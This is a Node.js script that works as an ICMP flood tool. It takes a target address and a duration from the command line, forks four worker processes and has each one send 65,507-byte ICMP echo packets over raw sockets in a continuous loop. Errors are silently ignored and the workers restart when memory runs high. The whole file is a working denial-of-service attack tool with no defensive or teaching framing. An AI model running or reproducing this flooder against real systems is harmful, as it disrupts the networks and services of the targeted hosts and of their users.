const raw = require('raw-socket');
const { Buffer } = require('buffer');
const cluster = require('cluster');
const os = require('os');

if (process.argv.length < 4) {
    console.error('Usage: node icmp <target> <time>');
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3])
};

if (cluster.isMaster) {
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        console.log('[>] Restarting script...');
        setTimeout(() => {
            for (let counter = 1; counter <= 4; counter++) {
                cluster.fork();
            }
        }, 1000);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= 80) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 1000);

    for (let counter = 1; counter <= 4; counter++) {
        cluster.fork();
    }

    setTimeout(() => {
        process.exit();
    }, args.time * 1000);

} else {
    setInterval(runFlooder);
}

const packetSize = 65507;

function createPacket() {
    const buffer = Buffer.alloc(packetSize);
    buffer.fill(0);
    buffer.writeUInt8(8, 0); // Type
    buffer.writeUInt8(0, 1); // Code
    buffer.writeUInt16BE(0, 2); // Checksum placeholder
    buffer.writeUInt16BE(0, 4); // Identifier
    buffer.writeUInt16BE(0, 6); // Sequence number

    const checksum = raw.createChecksum(buffer);
    buffer.writeUInt16BE(checksum, 2);
    return buffer;
}

function sendPackets(target) {
    const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });
    socket.on('error', (error) => {
    });
    const packet = createPacket();
    function send() {
        socket.send(packet, 0, packet.length, target, (error) => {
            if (error) {
            }
            setImmediate(send);
        });
    }
    send();
}

function runFlooder() {
    const intervalAttack = setInterval(() => {
        for (let counter = 1; counter <= 10; counter++) {
            sendPackets(args.target);
        }
    }, 1000);
}